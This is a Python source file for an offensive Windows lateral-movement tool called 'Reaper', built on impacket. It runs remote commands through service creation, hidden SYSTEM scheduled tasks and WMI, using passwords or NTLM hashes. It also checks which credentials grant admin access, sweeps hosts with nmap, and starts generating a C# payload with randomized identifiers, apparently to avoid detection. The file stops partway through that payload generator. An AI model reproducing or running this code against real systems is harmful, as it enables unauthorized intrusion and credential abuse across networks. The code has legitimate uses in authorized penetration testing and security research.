from __future__ import division
from __future__ import print_function
import os
import re
import sys
import apt
import cmd
import time
import nmap
import glob
import ntpath
import socket
import random
import string
import hashlib
import logging
import fnmatch
import requests
import argparse
import threading
import subprocess
import collections
import socket, errno
import netifaces as ni
from base64 import b64encode
from datetime import datetime
from pebble import ProcessPool
from argparse import RawTextHelpFormatter

from six import PY2
from impacket import version
from impacket import smbserver
from impacket.examples import logger
from impacket.krb5.keytab import Keytab
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import tsch, transport
from impacket.examples.utils import parse_target
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21

try:
    import ConfigParser
except ImportError:
    import configparser as ConfigParser

from threading import Thread
from impacket import version, smbserver
from impacket.dcerpc.v5 import transport, scmr

BATCH_FILENAME = ''.join(random.choices(string.ascii_uppercase, k=random.randrange(8, 15))) + '.bat'
SERVICE_NAME = ''.join(random.choices(string.ascii_uppercase, k=random.randrange(8, 15)))
OUTPUT_FILENAME = '__' + str(time.time())
CODEC = sys.stdout.encoding
timestamp = str(datetime.fromtimestamp(time.time())).replace(' ', '_')
acct_chk_fail = []  # this list is used to track failed login attempts
acct_chk_valid = []  # this is used to track previously valid accounts

###################COLORS#################
color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_BLU = '\033[94m'
color_PURP = '\033[35m'
color_reset = '\033[0m'
green_plus = '{}[+]{}'.format(color_GRE, color_reset)
red_minus = '{}[-]{}'.format(color_RED, color_reset)
gold_plus = '{}[+]{}'.format(color_YELL, color_reset)

reaper_banner = """

 ██{}▓{}      ██████  ▄▄▄          ██▀███  {}▓{}█████ ▄▄▄       ██{}▓{}███  {}▓{}█████  ██▀███  
{}▓{}██{}▒    ▒{}██    {}▒ ▒{}████▄       {}▓{}██ {}▒{} ██{}▒▓{}█   ▀{}▒{}████▄    {}▓{}██{}░{}  ██{}▒▓{}█   ▀ {}▓{}██ {}▒{} ██{}▒{}
{}▒{}██{}░    ░ ▓{}██▄   {}▒{}██  ▀█▄     {}▓{}██ {}░{}▄█ {}▒▒{}███  {}▒{}██  ▀█▄  {}▓{}██{}░{} ██{}▓▒▒{}███   {}▓{}██ {}░{}▄█ {}▒{}
{}▒{}██{}░      ▒{}   ██{}▒░{}██▄▄▄▄██    {}▒{}██▀▀█▄  {}▒▓{}█  ▄{}░{}██▄▄▄▄██ {}▒{}██▄█{}▓▒ ▒▒▓{}█  ▄ {}▒{}██▀▀█▄  
{}░{}██████{}▒▒{}██████{}▒▒ ▓{}█   {}▓{}██{}▒   ░{}██{}▓ ▒{}██{}▒░▒{}████{}▒▓{}█   {}▓{}██{}▒▒{}██{}▒ ░  ░░▒{}████{}▒░{}██{}▓ ▒{}██{}▒
░ ▒░▓  ░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒{}█{}░   ░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒{}█{}░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░ ▒  ░░ ░▒  ░ ░  ▒   ▒▒ ░     ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░
  ░ ░   ░  ░  ░    ░   ▒        ░░   ░    ░    ░   ▒   ░░          ░     ░░   ░ 
    ░  ░      ░        ░  ░      ░        ░  ░     ░  ░            ░  ░   ░  {}                                                                                   
""".format(color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset,
           color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset)

cwd = os.path.abspath(os.path.dirname(__file__))


def lognoprint(logme):
    with open('{}/log.txt'.format(cwd), 'a') as f:
        f.write(logme + '\n')
        f.close()

    with open('{}/indivlog.txt'.format(cwd), 'a') as f:
        f.write(logme + '\n')
        f.close()


def printnlog(printlogme):
    with open('{}/log.txt'.format(cwd), 'a') as f:
        f.write(printlogme + '\n')
        f.close()

    with open('{}/indivlog.txt'.format(cwd), 'a') as f:
        f.write(printlogme + '\n')
        f.close()

    print(printlogme)


if os.path.isfile('{}/indivlog.txt'.format(cwd)):
    os.system('sudo rm {}/indivlog.txt'.format(cwd))

lognoprint('\n{}{}{}\n'.format(color_PURP, timestamp, color_reset))


################################################ Start of SMBEXEC ###############################################################

class CMDEXEC:
    def __init__(self, command2run='', username='', password='', domain='', hashes=None, aesKey=None, doKerberos=None,
                 kdcHost=None, share=None, port=445, serviceName=SERVICE_NAME, shell_type=None):

        self.__command2run = command2run
        self.__username = username
        self.__password = password
        self.__port = port
        self.__serviceName = serviceName
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__share = share
        self.__shell_type = shell_type
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, remoteName, remoteHost):
        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
        logging.debug('StringBinding %s' % stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)
        rpctransport.setRemoteHost(remoteHost)
        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                         self.__nthash, self.__aesKey)
        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.shell = None
        try:
            self.shell = SMBEXECShell(self.__share, rpctransport, self.__serviceName, self.__shell_type, self.__command2run, remoteName)
        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.critical(str(e))
            if self.shell is not None:
                self.shell.finish()
            sys.stdout.flush()
            sys.exit(1)


class SMBEXECShell():
    def __init__(self, share, rpc, serviceName, shell_type, command2run, addr):

        self.__share = share
        self.__output = '\\\\127.0.0.1\\' + self.__share + '\\' + OUTPUT_FILENAME
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
        self.__outputBuffer = b''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__shell_type = shell_type
        self.__serviceName = serviceName
        self.__rpc = rpc

        self.__scmr = rpc.get_dce_rpc()
        try:
            self.__scmr.connect()
        except Exception as e:
            logging.critical(str(e))
            sys.exit(1)

        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']
        self.transferClient = rpc.get_smb_connection()
        self.do_cd('', addr)
        if command2run == 'wmic logicaldisk get caption ':  # so auto drive can work since it does not conatin any & symbols
            self.send_data(command2run, addr)
        else:
            tmphold = self.send_data(command2run[:command2run.find('&')], addr)
            if (tmphold.find('The command completed successfully') != -1 and tmphold.find('System error 85 has occurred') == -1):  # SMBEXEC dummy and cant accept && so we must ensure that the net use command worked so we dont delete client shares ##
                command2run = command2run[command2run.find('&&') + 3:]
                tmphold = self.send_data(command2run[:command2run.find('&')], addr)
                command2run = command2run[command2run.find('&&') + 3:]
                tmphold = self.send_data(command2run[:command2run.find('&')], addr)
            else:
                printnlog('{}: {}'.format(addr, tmphold))

    def finish(self):
        # Just in case the service is still created
        try:
            self.__scmr = self.__rpc.get_dce_rpc()
            self.__scmr.connect()
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp['lpScHandle']
            resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
            service = resp['lpServiceHandle']
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except scmr.DCERPCException:
            pass

    def do_cd(self, s, addr):
        # We just can't CD or maintain track of the target dir.
        if len(s) > 0:
            logging.error("You can't CD under SMBEXEC. Use full paths.")

        self.execute_remote('cd ', addr)
        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = self.__outputBuffer.decode().replace('\r\n', '') + '>'

            self.__outputBuffer = b''

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
        self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)

    def execute_remote(self, data, addr, shell_type='cmd'):

        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + \
                  self.__shell + self.__batchFile

        command += ' & ' + '%COMSPEC% /Q /c del ' + self.__batchFile

        logging.debug('Executing %s' % command)
        lognoprint('{}: {}\n'.format(addr, 'Executing %s' % command))

        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
                                     lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
        service = resp['lpServiceHandle']

        try:
            scmr.hRStartServiceW(self.__scmr, service)
        except:
            pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output()

    def send_data(self, data, addr):
        self.execute_remote(data, addr, self.__shell_type)
        try:
            data_out = self.__outputBuffer.decode(CODEC)
            if logging.getLogger().level == logging.DEBUG:
                print('{}: {}'.format(addr, data_out))
            with open('{}/drives.txt'.format(cwd), 'a') as f:  # writing to a file gets around the issue of multithreading not being easily readable
                f.write(data_out)
                f.close()

            lognoprint('{}: {}\n'.format(addr, data_out))
            self.__outputBuffer = b''
            return data_out
        except UnicodeDecodeError:
            if data != 'wmic logicaldisk get caption ':
                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py '
                              'again with -codec and the corresponding codec')
                printnlog('{}: {}\n'.format(addr, self.__outputBuffer.decode(CODEC, errors='replace')))
            with open('{}/drives.txt'.format(cwd), 'a') as f:  # writing to a file gets around the issue of multithreading not being easily readable
                f.write(self.__outputBuffer.decode(CODEC, errors='replace'))
                f.close()

        self.__outputBuffer = b''


################################################ End of SMBEXEC ###################################################################


################################################# START OF ATEXEC #########################################################################
class TSCH_EXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=False, kdcHost=None,
                 command=None, sessionId=None, silentCommand=False):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__command = command
        self.__silentCommand = silentCommand
        self.sessionId = sessionId

        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def play(self, addr):
        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % addr
        rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                         self.__aesKey)
            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
        try:
            self.doStuff(rpctransport, addr)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            lognoprint('{}: {}\n'.format(addr, e))
            logging.error('{}: {}'.format(addr, e))
            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')

    def doStuff(self, rpctransport, addr):
        def output_callback(data):
            try:
                lognoprint('{}: {}\n'.format(addr, data.decode(CODEC)))
                if logging.getLogger().level == logging.DEBUG:
                    print('{}: {}'.format(addr, data.decode(CODEC)))
            except UnicodeDecodeError:
                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute atexec.py '
                              'again with -codec and the corresponding codec')
                printnlog('{}: {}'.format(addr, data.decode(CODEC, errors='replace')))

        def xml_escape(data):
            replace_table = {
                "&": "&amp;",
                '"': "&quot;",
                "'": "&apos;",
                ">": "&gt;",
                "<": "&lt;",
            }
            return ''.join(replace_table.get(c, c) for c in data)

        def cmd_split(cmdline):
            cmdline = cmdline.split(" ", 1)
            cmd = cmdline[0]
            args = cmdline[1] if len(cmdline) > 1 else ''

            return [cmd, args]

        dce = rpctransport.get_dce_rpc()

        dce.set_credentials(*rpctransport.get_credentials())
        if self.__doKerberos is True:
            dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        dce.connect()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
        tmpFileName = tmpName + '.tmp'

        if self.sessionId is not None:
            cmd, args = cmd_split(self.__command)
        else:
            cmd = "cmd.exe"
            args = "/C %s > %%windir%%\\Temp\\%s 2>&1" % (self.__command, tmpFileName)

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>%s</Command>
      <Arguments>%s</Arguments>
    </Exec>
  </Actions>
</Task>
        """ % ((xml_escape(cmd) if self.__silentCommand is False else self.__command.split()[0]),
               (xml_escape(args) if self.__silentCommand is False else " ".join(self.__command.split()[1:])))
        taskCreated = False
        try:
            lognoprint('{}: Creating task \\{}\n'.format(addr, tmpName))
            if logging.getLogger().level == logging.DEBUG:
                logging.info('{}: Creating task \\{}'.format(addr, tmpName))
            tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
            taskCreated = True

            lognoprint('{}: Running task \\{}\n'.format(addr, tmpName))
            if logging.getLogger().level == logging.DEBUG:
                logging.info('{}: Running task \\{}'.format(addr, tmpName))
            done = False

            if self.sessionId is None:
                tsch.hSchRpcRun(dce, '\\%s' % tmpName)
            else:
                try:
                    tsch.hSchRpcRun(dce, '\\%s' % tmpName, flags=tsch.TASK_RUN_USE_SESSION_ID, sessionId=self.sessionId)
                except Exception as e:
                    if str(e).find('ERROR_FILE_NOT_FOUND') >= 0 or str(e).find('E_INVALIDARG') >= 0:
                        logging.info('The specified session doesn\'t exist!')
                        done = True
                    else:
                        raise

            while not done:
                logging.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
                resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
                if resp['pLastRuntime']['wYear'] != 0:
                    done = True
                else:
                    time.sleep(2)
            lognoprint('{}: Deleting task \\{}\n'.format(addr, tmpName))
            if logging.getLogger().level == logging.DEBUG:
                logging.info('{}: Deleting task \\{}'.format(addr, tmpName))
            tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
            taskCreated = False
        except tsch.DCERPCSessionError as e:
            logging.error(e)
            e.get_packet().dump()
        finally:
            if taskCreated is True:
                tsch.hSchRpcDelete(dce, '\\%s' % tmpName)

        if self.sessionId is not None:
            dce.disconnect()
            return

        if self.__silentCommand:
            dce.disconnect()
            return

        smbConnection = rpctransport.get_smb_connection()
        waitOnce = True
        while True:
            try:
                time.sleep(6)
                lognoprint('{}: Attempting to read ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
                if logging.getLogger().level == logging.DEBUG:
                    logging.info('{}: Attempting to read ADMIN$\\Temp\\{}'.format(addr, tmpFileName))
                smbConnection.getFile('ADMIN$', 'Temp\\%s' % tmpFileName, output_callback)
                break
            except Exception as e:
                if str(e).find('SHARING') > 0:
                    time.sleep(3)
                elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0:
                    if waitOnce is True:
                        # We're giving it the chance to flush the file before giving up
                        time.sleep(3)
                        waitOnce = False
                    else:
                        raise
                else:
                    raise
        lognoprint('{}: Deleting file ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
        if logging.getLogger().level == logging.DEBUG:
            logging.debug('{}: Deleting file ADMIN$\\Temp\\{}'.format(addr, tmpFileName))
        smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % tmpFileName)

        dce.disconnect()


########################################## END OF ATEXEC ############################################################################

########################################## START OF WMIEXEC #########################################################################
class WMIEXEC:
    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share=None,
                 noOutput=False, doKerberos=False, kdcHost=None, shell_type=None):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__share = share
        self.__noOutput = noOutput
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__shell_type = shell_type
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr, silentCommand=False):
        if self.__noOutput is False and silentCommand is False:
            smbConnection = SMBConnection(addr, addr)
            if self.__doKerberos is False:
                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)

            dialect = smbConnection.getDialect()

            if dialect == SMB_DIALECT:
                lognoprint("{}: SMBv1 dialect used\n".format(addr))
            elif dialect == SMB2_DIALECT_002:
                lognoprint("{}: SMBv2.0 dialect used\n".format(addr))
            elif dialect == SMB2_DIALECT_21:
                lognoprint("{}: SMBv2.1 dialect used\n".format(addr))
            else:
                lognoprint("{}: SMBv3.0 dialect used\n".format(addr))

            if logging.getLogger().level == logging.DEBUG:
                if dialect == SMB_DIALECT:
                    logging.info("{}: SMBv1 dialect used".format(addr))
                elif dialect == SMB2_DIALECT_002:
                    logging.info("{}: SMBv2.0 dialect used".format(addr))
                elif dialect == SMB2_DIALECT_21:
                    logging.info("{}: SMBv2.1 dialect used".format(addr))
                else:
                    logging.info("{}: SMBv3.0 dialect used".format(addr))
        else:
            smbConnection = None

        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)  # if firewall blocking program hangs here
            iWbemLevel1Login.RemRelease()

            win32Process, _ = iWbemServices.GetObject('Win32_Process')

            self.shell = RemoteShell(self.__share, win32Process, smbConnection, self.__shell_type, addr, silentCommand)
            self.shell.onecmd(self.__command)
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            lognoprint('{}: {}\n'.format(addr, str(e)))
            logging.error('{}: {}'.format(addr, str(e)))
            if smbConnection is not None:
                smbConnection.logoff()
            dcom.disconnect()
            sys.stdout.flush()
            pass

        if smbConnection is not None:
            smbConnection.logoff()
        dcom.disconnect()


class RemoteShell(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection, shell_type, addr, silentCommand=False):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\' + OUTPUT_FILENAME
        self.__outputBuffer = str('')
        self.__shell = 'cmd.exe /Q /c '
        self.__shell_type = shell_type
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__silentCommand = silentCommand
        self.__pwd = str('C:\\')
        self.__noOutput = False
        self.__addr = addr

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(30000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

        # If the user wants to just execute a command without cmd.exe, set raw command and set no output
        if self.__silentCommand is True:
            self.__shell = ''

    def do_cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''
        else:
            if PY2:
                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s.decode(sys.stdin.encoding)))
            else:
                self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = (self.__pwd + '>')

            self.__outputBuffer = ''

    def default(self, line):
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                # Something went wrong
                printnlog(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = (self.__pwd + '>')
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                if logging.getLogger().level == logging.DEBUG and options.drive != None:
                    logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                                  'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute wmiexec.py '
                                  'again with -codec and the corresponding codec')
                self.__outputBuffer += data.decode(CODEC, errors='replace')


        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >= 0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    logging.debug('Connection broken, trying to recreate it')
                    self.__transferClient.reconnect()
                    return self.get_output()
        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data, shell_type='cmd'):

        command = self.__shell + data

        if self.__noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output + ' 2>&1'
        if PY2:
            self.__win32Process.Create(command.decode(sys.stdin.encoding), self.__pwd, None)
        else:
            self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data, self.__shell_type)
        with open('{}/drives.txt'.format(cwd), 'a') as f:  # writing to a file gets around the issue of multithreading not being easily readable
            f.write(self.__outputBuffer)
            f.close()
        lognoprint('{}: {}\n'.format(self.__addr, self.__outputBuffer))
        if logging.getLogger().level == logging.DEBUG:
            print('{}: {}\n'.format(self.__addr, self.__outputBuffer))
        self.__outputBuffer = ''


class AuthFileSyntaxError(Exception):
    '''raised by load_smbclient_auth_file if it encounters a syntax error
    while loading the smbclient-style authentication file.'''

    def __init__(self, path, lineno, reason):
        self.path = path
        self.lineno = lineno
        self.reason = reason

    def __str__(self):
        return 'Syntax error in auth file %s line %d: %s' % (
            self.path, self.lineno, self.reason)


def load_smbclient_auth_file(path):
    '''Load credentials from an smbclient-style authentication file (used by
    smbclient, mount.cifs and others).  returns (domain, username, password)
    or raises AuthFileSyntaxError or any I/O exceptions.'''

    lineno = 0
    domain = None
    username = None
    password = None
    for line in open(path):
        lineno += 1

        line = line.strip()

        if line.startswith('#') or line == '':
            continue

        parts = line.split('=', 1)
        if len(parts) != 2:
            raise AuthFileSyntaxError(path, lineno, 'No "=" present in line')

        (k, v) = (parts[0].strip(), parts[1].strip())

        if k == 'username':
            username = v
        elif k == 'password':
            password = v
        elif k == 'domain':
            domain = v
        else:
            raise AuthFileSyntaxError(path, lineno, 'Unknown option %s' % repr(k))

    return (domain, username, password)


############################################################################### END OF WMIEXEC#####################################################

def check_accts(username, password, domain, remoteName, remoteHost, hashes=None, aesKey=None, doKerberos=None, kdcHost=None, port=445):
    upasscombo = '{}:{}'.format(username, password)

    nthash = ''
    lmhash = ''
    if hashes is not None:
        lmhash, nthash = hashes.split(':')
        upasscombo = '{}:{}'.format(username, nthash)

    stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
    logging.debug('StringBinding %s' % stringbinding)
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_dport(port)
    rpctransport.setRemoteHost(remoteHost)
    if hasattr(rpctransport, 'set_credentials'):
        # This method exists only for selected protocol sequences.
        rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)

    rpctransport.set_kerberos(doKerberos, kdcHost)

    try:
        samr = rpctransport.get_dce_rpc()
        try:
            samr.connect()
        except Exception as e:
            acct_chk_fail.append(username)
            printnlog('{} {} {}'.format(red_minus, upasscombo.ljust(30), str(e)[:str(e).find("(")]))

        s = rpctransport.get_smb_connection()
        s.setTimeout(100000)
        samr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(samr)
        scHandle = resp['lpScHandle']
        acct_chk_valid.append(username)
        printnlog('{} {} {}'.format(gold_plus, upasscombo.ljust(30), "Valid Admin Creds"))


    except  (Exception, KeyboardInterrupt) as e:
        if str(e).find("rpc_s_access_denied") != -1 and str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") == -1:
            acct_chk_valid.append(username)
            printnlog('{} {} {}'.format(green_plus, upasscombo.ljust(30), "Valid Creds"))


def do_ip(inpu, local_ip):  # check if the inputted ips are up so we dont scan thigns we dont need to
    printnlog('\n[scanning hosts]')
    scanner = nmap.PortScanner()
    if os.path.isfile(inpu):  # if its in a file the arguments are different
        scanner.scan(arguments='-n -sn -iL {}'.format(inpu))
    else:
        scanner.scan(hosts=inpu, arguments='-n -sn')
    uphosts = scanner.all_hosts()

    try:
        uphosts.remove(local_ip)  # no point in attacking ourselves
    except:
        pass

    printnlog('[scan complete]')

    return uphosts

def gen_payload_exe_mdwd(share_name, payload_name, addresses_array, drive_letter):
    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    namespace = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    Program = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    IsAdministrator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
    process = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
    lines = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    ipEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    ip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    i = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    thismachinesip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    fs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    exe_payload = ''
    exe_payload += 'using System;\n'
    exe_payload += 'using System.IO;\n'
    exe_payload += 'using System.Text;\n'
    exe_payload += 'using System.Linq;\n'
    exe_payload += 'using System.ComponentModel;\n'
    exe_payload += 'using System.Diagnostics;\n'
    exe_payload += 'using System.Runtime.InteropServices;\n'
